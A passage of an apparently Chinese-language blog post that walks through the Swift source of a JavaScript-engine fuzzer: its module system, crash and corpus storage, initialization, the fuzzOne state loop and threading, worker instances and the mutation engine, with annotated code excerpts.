class="hljs-type">Fuzzer</span>) &#123;&#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">var</span> name: <span class="hljs-type">String</span> &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-type">String</span>(describing: <span class="hljs-built_in">type</span>(of: <span class="hljs-keyword">self</span>))<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">var</span> name: <span class="hljs-type">String</span> &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-type">String</span>(describing: <span class="hljs-keyword">self</span>)<br>    &#125;<br><br>    <span class="hljs-comment">/// Returns the instance of this module on the provided fuzzer instance if it exists, nil otherwise.</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">func</span> <span class="hljs-title function_">instance</span>(<span class="hljs-params">for</span> <span class="hljs-params">fuzzer</span>: <span class="hljs-type">Fuzzer</span>) -&gt; <span class="hljs-keyword">Self</span><span class="hljs-operator">?</span> &#123;<br>        <span class="hljs-keyword">if</span> <span class="hljs-keyword">let</span> instance <span class="hljs-operator">=</span> fuzzer.modules[<span class="hljs-keyword">self</span>.name] &#123;<br>            <span class="hljs-keyword">return</span> instance <span class="hljs-keyword">as?</span> <span class="hljs-keyword">Self</span><br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">nil</span><br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>以<code>Storage</code>模块为例子，该模块初始化时会向<code>Fuzzer</code>对象的<code>CrashFound</code>和<code>InterestingProgramFound</code>事件注册回调，用于在发现crash和interesting prog时将其保存在磁盘中。</p><figure class="highlight swift"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs swift"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Storage</span>: <span class="hljs-title class_ inherited__">Module</span> &#123;<br><br>    <span class="hljs-comment">// fuzzer对象初始化完毕后回调该模块的该方法, 负责对fuzzer对象进行初始化</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">func</span> <span class="hljs-title function_">initialize</span>(<span class="hljs-params">with</span> <span class="hljs-params">fuzzer</span>: <span class="hljs-type">Fuzzer</span>) &#123;<br>        <span class="hljs-operator">...</span><br><br>        <span class="hljs-comment">// 在fuzzer中注册事件回调, 在发现crash时写入到磁盘中</span><br>        fuzzer.registerEventListener(for: fuzzer.events.<span class="hljs-type">CrashFound</span>) &#123; ev <span class="hljs-keyword">in</span><br>            <span class="hljs-keyword">let</span> filename <span class="hljs-operator">=</span> <span class="hljs-string">&quot;program_<span class="hljs-subst">\(<span class="hljs-keyword">self</span>.formatDate())</span>_<span class="hljs-subst">\(ev.program.id)</span>_<span class="hljs-subst">\(ev.behaviour.rawValue)</span>&quot;</span><br>            <span class="hljs-keyword">if</span> ev.isUnique &#123;<br>                <span class="hljs-keyword">self</span>.storeProgram(ev.program, as: filename, in: <span class="hljs-keyword">self</span>.crashesDir)<br>            &#125; <span class="hljs-keyword">else</span> &#123;<br>                <span class="hljs-keyword">self</span>.storeProgram(ev.program, as: filename, in: <span class="hljs-keyword">self</span>.duplicateCrashesDir)<br>            &#125;<br>        &#125;<br><br>        <span class="hljs-comment">// 注册事件回调: 发现interesting prog时写入到磁盘中</span><br>        fuzzer.registerEventListener(for: fuzzer.events.<span class="hljs-type">InterestingProgramFound</span>) &#123; ev <span class="hljs-keyword">in</span><br>            <span class="hljs-keyword">let</span> filename <span class="hljs-operator">=</span> <span class="hljs-string">&quot;program_<span class="hljs-subst">\(<span class="hljs-keyword">self</span>.formatDate())</span>_<span class="hljs-subst">\(ev.program.id)</span>&quot;</span><br>            <span class="hljs-keyword">self</span>.storeProgram(ev.program, as: filename, in: <span class="hljs-keyword">self</span>.corpusDir)<br>        &#125;<br>        <span class="hljs-operator">...</span><br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>可以发现，Fuzzer对象初始化完毕后回调模块中的<code>initialize()</code>方法，各个模块可以根据需求对Fuzzer进行一些修改以实现功能。</p><figure class="highlight swift"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs swift">fuzzer.initialize()<span class="hljs-comment">// fuzzer对象的初始化</span><br>fuzzer.runStartupTests()<span class="hljs-comment">// 进行fuzz loop启动前的测试</span><br><br><span class="hljs-comment">// Start the main fuzzing job.</span><br>fuzzer.start(runUntil: exitCondition)<br></code></pre></td></tr></table></figure><p><code>Fuzzer::initial()</code>会调用所有依赖组件的<code>initialize()</code>方法，完成依赖组件的初始化，至此<code>Fuzzer</code>对象才算是初始化完毕；然后回调所有模块的初始化方法，完成模块的安装；最后发送<code>Initialized</code>事件。</p><figure class="highlight swift"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br></pre></td><td class="code"><pre><code class="hljs swift"><span class="hljs-keyword">public</span> <span class="hljs-keyword">func</span> <span class="hljs-title function_">initialize</span>() &#123;<br>    dispatchPrecondition(condition: .onQueue(queue))<br>    <span class="hljs-built_in">assert</span>(<span class="hljs-operator">!</span>isInitialized)<br><br>    <span class="hljs-comment">// Initialize the script runner first so we are able to execute programs.</span><br>    <span class="hljs-comment">// 初始化脚本执行器，这样就可以执行js脚本了</span><br>    runner.initialize(with: <span class="hljs-keyword">self</span>)<br><br>    <span class="hljs-comment">// Then initialize all components. 初始化所有组件</span><br>    engine.initialize(with: <span class="hljs-keyword">self</span>)<br>    evaluator.initialize(with: <span class="hljs-keyword">self</span>)<br>    environment.initialize(with: <span class="hljs-keyword">self</span>)<br>    corpus.initialize(with: <span class="hljs-keyword">self</span>)<br>    minimizer.initialize(with: <span class="hljs-keyword">self</span>)<br>    corpusGenerationEngine.initialize(with: <span class="hljs-keyword">self</span>)<br><br>    <span class="hljs-comment">// Finally initialize all modules. 初始化所有模块</span><br>    <span class="hljs-keyword">for</span> module <span class="hljs-keyword">in</span> modules.values &#123;<br>        module.initialize(with: <span class="hljs-keyword">self</span>)<br>    &#125;<br><br>    <span class="hljs-comment">// Install a watchdog to monitor the utilization of this instance. 安装一个watchdog监控这个实例的使用情况</span><br>    <span class="hljs-keyword">var</span> lastCheck <span class="hljs-operator">=</span> <span class="hljs-type">Date</span>()<br>    timers.scheduleTask(every: <span class="hljs-number">1</span> <span class="hljs-operator">*</span> <span class="hljs-type">Minutes</span>) &#123;<br>        <span class="hljs-comment">// Monitor responsiveness</span><br>        <span class="hljs-keyword">let</span> now <span class="hljs-operator">=</span> <span class="hljs-type">Date</span>()<br>        <span class="hljs-keyword">let</span> interval <span class="hljs-operator">=</span> now.timeIntervalSince(lastCheck)<br>        lastCheck <span class="hljs-operator">=</span> now<br>        <span class="hljs-keyword">if</span> interval <span class="hljs-operator">&gt;</span> <span class="hljs-number">180</span> &#123;<br>            <span class="hljs-keyword">self</span>.logger.warning(<span class="hljs-string">&quot;Fuzzer appears unresponsive (watchdog only triggered after <span class="hljs-subst">\(Int(interval))</span>s instead of 60s).&quot;</span>)<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-comment">// Install a timer to monitor for faulty code generators and program templates. 安装一个计时器来监视错误的代码生成器和程序模板</span><br>    timers.scheduleTask(every: <span class="hljs-number">5</span> <span class="hljs-operator">*</span> <span class="hljs-type">Minutes</span>) &#123;<br>        <span class="hljs-keyword">for</span> generator <span class="hljs-keyword">in</span> <span class="hljs-keyword">self</span>.codeGenerators &#123;<br>            <span class="hljs-keyword">if</span> generator.totalSamples <span class="hljs-operator">&gt;=</span> <span class="hljs-number">100</span> <span class="hljs-operator">&amp;&amp;</span> generator.correctnessRate <span class="hljs-operator">&lt;</span> <span class="hljs-number">0.05</span> &#123;<br>                <span class="hljs-keyword">self</span>.logger.warning(<span class="hljs-string">&quot;Code generator <span class="hljs-subst">\(generator.name)</span> might be broken. Correctness rate is only <span class="hljs-subst">\(generator.correctnessRate <span class="hljs-operator">*</span> <span class="hljs-number">100</span>)</span>% after <span class="hljs-subst">\(generator.totalSamples)</span> generated samples&quot;</span>)<br>            &#125;<br>        &#125;<br>        <span class="hljs-keyword">for</span> template <span class="hljs-keyword">in</span> <span class="hljs-keyword">self</span>.programTemplates &#123;<br>            <span class="hljs-keyword">if</span> template.totalSamples <span class="hljs-operator">&gt;=</span> <span class="hljs-number">100</span> <span class="hljs-operator">&amp;&amp;</span> template.correctnessRate <span class="hljs-operator">&lt;</span> <span class="hljs-number">0.05</span> &#123;<br>                <span class="hljs-keyword">self</span>.logger.warning(<span class="hljs-string">&quot;Program template <span class="hljs-subst">\(template.name)</span> might be broken. Correctness rate is only <span class="hljs-subst">\(template.correctnessRate <span class="hljs-operator">*</span> <span class="hljs-number">100</span>)</span>% after <span class="hljs-subst">\(template.totalSamples)</span> generated samples&quot;</span>)<br>            &#125;<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-comment">// Determine our initial state if necessary.</span><br>    <span class="hljs-built_in">assert</span>(state <span class="hljs-operator">==</span> .uninitialized <span class="hljs-operator">||</span> state <span class="hljs-operator">==</span> .corpusImport)<br>    <span class="hljs-keyword">if</span> state <span class="hljs-operator">==</span> .uninitialized &#123;<br>        <span class="hljs-keyword">let</span> isChildNode <span class="hljs-operator">=</span> modules.values.contains(where: &#123; <span class="hljs-variable">$0</span> <span class="hljs-keyword">is</span> <span class="hljs-type">DistributedFuzzingChildNode</span> &#125;)<br>        <span class="hljs-keyword">if</span> isChildNode &#123;<br>            <span class="hljs-comment">// We&#x27;re a child node, so wait until we&#x27;ve received some kind of corpus from our parent node.</span><br>            <span class="hljs-comment">// We&#x27;ll change our state when we&#x27;re synchronized with our parent, see updateStateAfterSynchronizingWithParentNode() below.</span><br>            changeState(to: .waiting)<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            <span class="hljs-comment">// Start with corpus generation.</span><br>            <span class="hljs-built_in">assert</span>(corpus.isEmpty)<br>            changeState(to: .corpusGeneration)<br>        &#125;<br>    &#125;<br><br>    dispatchEvent(events.<span class="hljs-type">Initialized</span>)<span class="hljs-comment">// 触发事件：Fuzzer已初始化</span><br>    logger.info(<span class="hljs-string">&quot;Initialized&quot;</span>)<br>    isInitialized <span class="hljs-operator">=</span> <span class="hljs-literal">true</span><br>&#125;<br></code></pre></td></tr></table></figure><p>最后通过<code>fuzzer.start()</code>启动fuzz loop</p><figure class="highlight swift"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs swift"><span class="hljs-keyword">public</span> <span class="hljs-keyword">func</span> <span class="hljs-title function_">start</span>(<span class="hljs-params">runUntil</span> <span class="hljs-params">exitCondition</span>: <span class="hljs-type">ExitCondition</span> <span class="hljs-operator">=</span> .none) &#123;<br>    <span class="hljs-comment">// 线程安全检查</span><br>    dispatchPrecondition(condition: .onQueue(queue))<br>    <span class="hljs-comment">// 状态检查</span><br>    <span class="hljs-built_in">assert</span>(isInitialized)<br><span class="hljs-comment">// 设置退出条件</span><br>    <span class="hljs-keyword">self</span>.exitCondition <span class="hljs-operator">=</span> exitCondition<br><br>    logger.info(<span class="hljs-string">&quot;Let&#x27;s go!&quot;</span>)<br><span class="hljs-comment">// 调用FuzzOne，Fuzz一轮。和AFL++的Fuzz_one一样</span><br>    fuzzOne()<br>&#125;<br></code></pre></td></tr></table></figure><p>执行<code>fuzzOne()</code>开始第一次fuzz，注意<code>fuzzer.sync&#123;...&#125;是同步任务，所以此时是主线程在执行fuzzOne()</code>，<code>Fuzzer:fuzzOne()</code>函数如下：</p><figure class="highlight swift"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><code class="hljs swift"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Fuzzer</span> &#123;<br>    <span class="hljs-comment">// fuzzOne()在主线程执行一次后会通过DispatchQueue在另一个线程不断循环调用自身, 实现fuzz事件循环</span><br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">func</span> <span class="hljs-title function_">fuzzOne</span>() &#123;<br>        <span class="hljs-operator">...</span><br>        <span class="hljs-comment">// 检查是否fuzz结束</span><br>        <span class="hljs-keyword">switch</span> exitCondition &#123;<br>        <span class="hljs-keyword">case</span> .none:<br>            <span class="hljs-keyword">break</span><br>        <span class="hljs-keyword">case</span> .iterationsPerformed(<span class="hljs-keyword">let</span> maxIterations):   <span class="hljs-comment">// 迭代次数到达上限</span><br>            <span class="hljs-keyword">if</span> iterations <span class="hljs-operator">&gt;</span> maxIterations &#123;<br>                <span class="hljs-keyword">return</span> shutdown(reason: .finished)<br>            &#125;<br>        <span class="hljs-keyword">case</span> .timeFuzzed(<span class="hljs-keyword">let</span> maxRuntime):   <span class="hljs-comment">// 执行时间到达上线</span><br>            <span class="hljs-keyword">if</span> uptime() <span class="hljs-operator">&gt;</span> maxRuntime &#123;<br>                <span class="hljs-keyword">return</span> shutdown(reason: .finished)<br>            &#125;<br>        &#125;<br><br>        <span class="hljs-comment">// 根据当前fuzzer实例的状态进行处理, 真正干活的部分</span><br>        <span class="hljs-keyword">switch</span> state &#123;<br>        <span class="hljs-keyword">case</span> .uninitialized:<br>            <span class="hljs-operator">...</span><br>        <span class="hljs-keyword">case</span> .waiting:<br>            <span class="hljs-operator">...</span><br><br>        <span class="hljs-keyword">case</span> .corpusImport: <span class="hljs-comment">// 导入语料库, Fuzzer初始化完毕后就是该状态</span><br>            <span class="hljs-keyword">let</span> program <span class="hljs-operator">=</span> currentCorpusImportJob.nextProgram()<br><br>            <span class="hljs-keyword">if</span> currentCorpusImportJob.numberOfProgramsImportedSoFar <span class="hljs-operator">%</span> <span class="hljs-number">500</span> <span class="hljs-operator">==</span> <span class="hljs-number">0</span> &#123;<br>                logger.info(<span class="hljs-string">&quot;Corpus import progress: imported <span class="hljs-subst">\(currentCorpusImportJob.numberOfProgramsImportedSoFar)</span> of <span class="hljs-subst">\(currentCorpusImportJob.totalNumberOfProgramsToImport)</span> programs&quot;</span>)<br>            &#125;<br><br>            <span class="hljs-keyword">let</span> outcome <span class="hljs-operator">=</span> importProgram(program, origin: .corpusImport(mode: currentCorpusImportJob.importMode))    <span class="hljs-comment">// 导出语料</span><br>            currentCorpusImportJob.notifyImportOutcome(outcome)<br><br>            <span class="hljs-keyword">if</span> currentCorpusImportJob.isFinished &#123;    <span class="hljs-comment">// 导入完毕</span><br>                <span class="hljs-operator">...</span><br>                dispatchEvent(events.<span class="hljs-type">CorpusImportComplete</span>)    <span class="hljs-comment">// 触发事件</span><br>                changeState(to: .fuzzing)    <span class="hljs-comment">// 状态改变成.fuzzing</span><br>            &#125;<br><br>        <span class="hljs-keyword">case</span> .corpusGeneration: <span class="hljs-comment">// 在没有起始语料的情况下, 用于生成语料并进行fuzz</span><br>            <span class="hljs-operator">...</span><br><br>        <span class="hljs-keyword">case</span> .fuzzing:  <span class="hljs-comment">// 使用生成的语料对引擎进行fuzz</span><br>            iterations <span class="hljs-operator">+=</span> <span class="hljs-number">1</span><br>            engine.fuzzOne(fuzzGroup)   <span class="hljs-comment">// 使用fuzz引擎进行一轮的fuzz</span><br>        &#125;<br><br>        <span class="hljs-comment">// 一旦本次迭代的相关任务都处理完毕, 就立刻发送任务进行下一次迭代</span><br>        <span class="hljs-comment">// 一旦queue中的任务执行完毕, 就回调&#123;self.fuzzOne()&#125;从而再次执行</span><br>        <span class="hljs-comment">// 这样就相当于通过DispatchGroup在另一个线程中开启了一个不断调用self.fuzzOne()的循环</span><br>        fuzzGroup.notify(queue: queue) &#123;<br>            <span class="hljs-keyword">self</span>.fuzzOne()  <span class="hljs-comment">// Fuzzer::fuzzOne</span><br>        &#125;<br>    &#125;<br><br>    <span class="hljs-operator">...</span><br>&#125;<br></code></pre></td></tr></table></figure><p>需要关注两点：</p><ol><li>Fuzzer对象的状态变化：在提供初始语料库的情况下，Fuzzer对象的状态变化为<code>unintialized</code>&#x3D;&gt;<code>corpusImport</code>&#x3D;&gt;<code>fuzzing</code>。<code>Fuzzer:fuzzOne()</code>会根据当前不同的状态做不同的处理</li><li>线程调度：<code>Fuzzer::fuzzOne()</code>每处理一次当前状态，都会调用<code>fuzzGroup.notify()</code>开启下一轮迭代。</li></ol><p>整体线程执行模型可以概况如下：</p><ul><li>第一次调用<code>fuzzOne()</code>时由主线程执行，会执行fuzz相关的任务，在处理过程中外部有可能向<code>queue</code>中添加异步任务<ul><li>本轮处理完毕后，主线程会执行<code>fuzzGroup.notify(queue)&#123;...&#125;</code>添加一个异步任务：在<code>queue</code>中所有的任务处理完毕后触发回调，执行<code>fuzzOne()</code>开启新一轮的fuzz。主线程不会阻塞在<code>fuzzGroup</code>上，而是直接返回，然后永久等待。</li><li>后续swift会自动从线程池中调用线程处理<code>queue</code>和<code>fuzzGroup</code>中的异步任务，因此第二次再执行<code>fuzzOne()</code>时就是其他进程了</li><li>第二次<code>fuzzOne()</code>的执行过程与上述类似，最后又会通过<code>fuzzGroup</code>开启新一轮的循环</li></ul></li></ul><p>接下来是一个多线程的操作以及工作实例的配置。</p><figure class="highlight swift"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs swift"><span class="hljs-keyword">let</span> workerConfig <span class="hljs-operator">=</span> <span class="hljs-type">Configuration</span>(<br>    arguments: <span class="hljs-type">CommandLine</span>.arguments,<br>    timeout: <span class="hljs-type">UInt32</span>(timeout),<br>    logLevel: .warning,  <span class="hljs-comment">// 比主实例更低的日志级别</span><br>    startupTests: profile.startupTests,<br>    minimizationLimit: minimizationLimit,<br>    enableDiagnostics: <span class="hljs-literal">false</span>,  <span class="hljs-comment">// 禁用诊断（减少开销）</span><br>    enableInspection: inspect,<br>    staticCorpus: staticCorpus,<br>    tag: tag<br>)<br></code></pre></td></tr></table></figure><p>工作实例与之前的Fuzzer实例基本相同，<code>logLevel: .warning</code>减少日志输出，避免干扰。同时<code>enableDiagnostics: false</code>禁用调试功能，提升性能。接下来就是多线程工作实例的创建了。</p><figure class="highlight swift"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs swift"><span class="hljs-comment">// 创建多个从（子）Fuzzer对象</span><br><span class="hljs-keyword">for</span> <span class="hljs-keyword">_</span> <span class="hljs-keyword">in</span> <span class="hljs-number">1</span><span class="hljs-operator">..&lt;</span>numJobs &#123;<br>    <span class="hljs-keyword">let</span> worker <span class="hljs-operator">=</span> makeFuzzer(with: workerConfig)<span class="hljs-comment">// 为其子worker创建Fuzzer对象</span><br>    worker.async &#123;<span class="hljs-comment">// 子worker异步初始化</span><br>        <span class="hljs-comment">// Wait some time between starting workers to reduce the load on the main instance.</span><br>        <span class="hljs-comment">// If we start the workers right away, they will all very quickly find new coverage</span><br>        <span class="hljs-comment">// and send lots of (probably redundant) programs to the main instance.</span><br>        <span class="hljs-comment">// 启动从Fuzzer对象(主进程的是主Fuzzer对象)前随机等待</span><br>        <span class="hljs-keyword">let</span> minDelay <span class="hljs-operator">=</span> <span class="hljs-number">1</span> <span class="hljs-operator">*</span> <span class="hljs-type">Minutes</span><br>        <span class="hljs-keyword">let</span> maxDelay <span class="hljs-operator">=</span> <span class="hljs-number">10</span> <span class="hljs-operator">*</span> <span class="hljs-type">Minutes</span><br>        <span class="hljs-keyword">let</span> delay <span class="hljs-operator">=</span> <span class="hljs-type">Double</span>.random(in: minDelay<span class="hljs-operator">...</span>maxDelay) <span class="hljs-comment">// 随机延迟（1 ~ 10min）</span><br>        <span class="hljs-type">Thread</span>.sleep(forTimeInterval: delay)<br><br>        worker.addModule(<span class="hljs-type">Statistics</span>())<span class="hljs-comment">// 统计模块</span><br>        worker.addModule(<span class="hljs-type">ThreadChild</span>(for: worker, parent: fuzzer))<span class="hljs-comment">// 子线程模块，负责与主实例通信，将发现的新覆盖率程序或崩溃发送回主实例</span><br>        worker.initialize()<span class="hljs-comment">//Fuzzer对象初始化</span><br>        worker.start()<span class="hljs-comment">// 开始fuzz</span><br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>其中，numJobs是参数中配置的（默认为1）。随后使用makeFuzzer创建Fuzzer实例，然后加入线程worker中。避免所有工作实例同时发现新覆盖率，导致主实例被大量程序同步淹没，随机延迟1~10分钟使得工作实例负载均匀分布。</p><p>最后是main.swift的结束：</p><figure class="highlight swift"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs swift"><span class="hljs-type">RunLoop</span>.main.run()<span class="hljs-comment">// 主线程持续运行，开始在主任务队列中调度任务</span><br></code></pre></td></tr></table></figure><p>这是Swift中用于启动主线程事件的循环核心方法，它会启动主线程的<code>RunLoop</code>，<code>RunLoop.main.run()</code>会阻塞主线程，并持续处理事件。</p><p>接下来进一步看一轮fuzz中所做的事。</p><p>之前看到<code>Fuzzer::fuzzOne()</code>会调用<code>engine.fuzzOne(fuzzGroup)</code>进行一轮fuzz，由于前面文档所说的三种Engine，这里我们选取最基本的<code>MutationEngine</code>为例子。也就是engine.fuzzOne(fuzzGroup)，engine是MutationEngine</p><figure class="highlight swift"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><code class="hljs swift"><span class="hljs-keyword">public</span> <span class="hljs-keyword">override</span> <span class="hljs-keyword">func</span> <span class="hljs-title function_">fuzzOne</span>(<span class="hljs-keyword">_</span> <span class="hljs-params">group</span>: <span class="hljs-type">DispatchGroup</span>) &#123;<br>    <span class="hljs-keyword">var</span> parent <span class="hljs-operator">=</span> fuzzer.corpus.randomElementForMutating()<span class="hljs-comment">//从种子池中随机选择一个种子用于变异</span><br>    parent <span class="hljs-operator">=</span> prepareForMutating(parent)<span class="hljs-comment">// 进行变异前准备</span><br>    <span class="hljs-keyword">for</span> <span class="hljs-keyword">_</span> <span class="hljs-keyword">in</span> <span class="hljs-number">0</span><span class="hljs-operator">..&lt;</span>numConsecutiveMutations &#123;<span class="hljs-comment">// 生成种子的数量，也就是变异轮次</span><br>        <span class="hljs-comment">// <span class="hljs-doctag">TODO:</span> factor out code shared with the HybridEngine?</span><br>        <span class="hljs-keyword">var</span> mutator <span class="hljs-operator">=</span> fuzzer.mutators.randomElement()<span class="hljs-comment">//随机选择一个变异器</span><br>        <span class="hljs-keyword">let</span> maxAttempts <span class="hljs-operator">=</span> <span class="hljs-number">10</span><span class="hljs-comment">// 一个种子最多尝试变异次数为10次</span><br>        <span class="hljs-keyword">var</span> mutatedProgram: <span class="hljs-type">Program</span>? <span class="hljs-operator">=</span> <span class="hljs-literal">nil</span><br>        <span class="hljs-keyword">for</span> <span class="hljs-keyword">_</span> <span class="hljs-keyword">in</span> <span class="hljs-number">0</span><span class="hljs-operator">..&lt;</span>maxAttempts &#123;<br>            <span class="hljs-keyword">if</span> <span class="hljs-keyword">let</span> result <span class="hljs-operator">=</span> mutator.mutate(parent, for: fuzzer) &#123;<span class="hljs-comment">// 变异成功则停止</span><br>                <span class="hljs-comment">// Success!</span><br>                result.contributors.formUnion(parent.contributors)<br>                mutator.addedInstructions(result.size <span class="hljs-operator">-</span> parent.size)<br>                mutatedProgram <span class="hljs-operator">=</span> result<br>                <span class="hljs-keyword">break</span><br>            &#125; <span class="hljs-keyword">else</span> &#123;<br>                <span class="hljs-comment">// Try a different mutator.</span><br>                <span class="hljs-comment">// 变异失败，则重新随机选择一个变异器进行变异</span><br>                mutator.failedToGenerate()<br>                mutator <span class="hljs-operator">=</span> fuzzer.mutators.randomElement()<br>            &#125;<br>        &#125;<br>        <span class="hljs-keyword">guard</span> <span class="hljs-keyword">let</span> program <span class="hljs-operator">=</span> mutatedProgram <span class="hljs-keyword">else</span> &#123;<span class="hljs-comment">// 变异失败</span><br>            logger.warning(<span class="hljs-string">&quot;Could not mutate sample, giving up. Sample:<span class="hljs-subst">\n</span><span class="hljs-subst">\(FuzzILLifter().lift(parent))</span>&quot;</span>)<br>            <span class="hljs-keyword">continue</span><br>        &#125;<br>        <span class="hljs-built_in">assert</span>(program <span class="hljs-operator">!==</span> parent)<br>        <span class="hljs-keyword">let</span> outcome <span class="hljs-operator">=</span> execute(program)<span class="hljs-comment">// 执行变异后的js程序</span><br>        <span class="hljs-comment">// Mutate the program further if it succeeded.</span><br>        <span class="hljs-keyword">if</span> .succeeded <span class="hljs-operator">==</span> outcome &#123;<span class="hljs-comment">// 变异后的程序执行成功，那么就在该样本的基础上继续进行变异</span><br>            parent <span class="hljs-operator">=</span> program<br>        &#125;<br>    